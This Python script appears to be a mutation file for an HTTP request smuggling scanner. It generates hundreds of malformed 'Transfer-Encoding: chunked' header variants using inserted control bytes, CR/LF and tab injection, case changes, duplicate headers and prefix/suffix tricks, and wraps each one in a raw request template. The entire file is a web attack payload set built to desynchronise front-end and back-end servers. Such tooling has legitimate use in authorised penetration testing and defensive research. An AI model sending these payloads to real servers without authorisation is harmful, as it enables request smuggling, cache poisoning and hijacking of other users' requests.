
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
#	p.header += gadget + RN
#	print(p.header)
	return p

def permutation():
	result=[]
	positions=["g","T","ch",":","c","ed"]
	list=["\r\n","\r","\n","\t",""]
	templates=["%cTransfer-Encoding: chunked","Transfer-Encoding%c: chunked","Transfer-Encoding:%c chunked","Transfer-Encoding: %cchunked","Transfer-Encoding: chunked%c",
		"%cTransfer-Encoding%c: chunked","%cTransfer-Encoding:%c chunked","%cTransfer-Encoding: %cchunked","%cTransfer-Encoding: chunked%c",
		"Transfer-Encoding%c:%c chunked","Transfer-Encoding%c: %cchunked","Transfer-Encoding%c: chunked%c",
		"Transfer-Encoding:%c %cchunked","Transfer-Encoding:%c chunked%c",
		"Transfer-Encoding: %cchunked%c",
		
		"%cTransfer-Encoding%c:%c chunked",
		"%cTransfer-Encoding%c: %cchunked",
		"%cTransfer-Encoding%c: chunked%c",
		"%cTransfer-Encoding:%c %cchunked",
		"%cTransfer-Encoding:%c  chunked%c",
		"%cTransfer-Encoding: %cchunked%c",
		"Transfer-Encoding%c:%c %cchunked",
		"Transfer-Encoding%c:%c chunked%c",
		"Transfer-Encoding%c: %cchunked%c",
		"Transfer-Encoding:%c %cchunked%c",
		
		"%cTransfer-Encoding%c:%c %cchunked","Transfer-Encoding%c:%c %cchunked%c","%cTransfer-Encoding:%c %cchunked%c","%cTransfer-Encoding%c: %cchunked%c","%cTransfer-Encoding%c:%c chunked%c",
		"%cTransfer-Encoding%c:%c %cchunked%c"]
	for element in list:
		for position in positions:
#			for i in range(0x1,0xff):
			for template in templates:
				if position in ["T","ch",":"]:
					result.append(template.replace(position,element+position))
#						mutation["position-%c-list-%02x-i-%02x"%position,element,i]=render_template(template.replace(position,element+position))
				if position in ["g","ed",":"]:
#					if position == "d" 
					result.append(template.replace(position,position+element))
	return result
#						mutation["position-%c-list-%02x-i-%02x"%position,element,i]=render_template(template.replace(position,position+element))

#permutation(render_template)

result=permutation()
#print(result)
for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
	for each in result:
#		print(each)
#		mutacao=each.translate ({ord(c): " " for c in "!@#$%^&*()[]{};:,./<>?\|`~-=_+"})
#		print(each)
#		print(i)
		mutations[each.replace("\n","0a").replace("\r","0d").replace("\t","09").replace("%c","%02x"%i).replace(" ","20")] = render_template(each.replace("%c","%c"%i))


mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["spacejoin1"] = render_template("Transfer Encoding: chunked")
mutations["underjoin1"] = render_template("Transfer_Encoding: chunked")
mutations["smashed"] = render_template("Transfer Encoding:chunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
#mutations["valueprefix1"] = render_template("Transfer-Encoding:  chunked") already checked
mutations["vertprefix1"] = render_template("Transfer-Encoding:\u000Bchunked")
mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
mutations["contentEnc"] = render_template("Content-Encoding: chunked")
mutations["linewrapped1"] = render_template("Transfer-Encoding:\n chunked")
mutations["quoted"] = render_template("Transfer-Encoding: \"chunked\"")
mutations["aposed"] = render_template("Transfer-Encoding: 'chunked'")
mutations["lazygrep"] = render_template("Transfer-Encoding: chunk")
mutations["sarcasm"] = render_template("TrAnSFer-EnCODinG: cHuNkeD")
mutations["yelling"] = render_template("TRANSFER-ENCODING: CHUNKED")
mutations["0dsuffix"] = render_template("Transfer-Encoding: chunked\r")
mutations["tabsuffix"] = render_template("Transfer-Encoding: chunked\t")
mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["0dspam"] = render_template("Transfer\r-Encoding: chunked")
mutations["nested"] = render_template("Transfer-Encoding: cow chunked bar")
mutations["spaceFF"] = render_template("Transfer-Encoding:\xFFchunked")
mutations["accentCH"] = render_template("Transfer-Encoding: ch\x96nked")
mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")
list=["","\r","\n","\t","\r\n"]
for i in range(0x1,0xff):

#	for element in list:


	mutations["prefix1-%02x"%i] = render_template("Transfer-Encoding: %cchunked"%(i))
	mutations["prefix2-%02x"%i] = render_template("Transfer-Encoding:%c chunked"%(i))
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
#	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding: %cchunked"%(i,i))
	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c: %cchunked"%(i,i))
	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))

#for i in range(0x7F,0x100):
#	mutations["prefix1-%02x"%i] = render_template("Transfer-Encoding: %cchunked"%(i))
#	mutations["prefix2-%02x"%i] = render_template("Transfer-Encoding:%c chunked"%(i))
#	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
#	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
#	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
#	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
#	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
#	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
#	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
#	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
#	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
#	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
#	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
#	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding: %cchunked"%(i,i))
#	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
#	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c: %cchunked"%(i,i))
#	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
##	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))
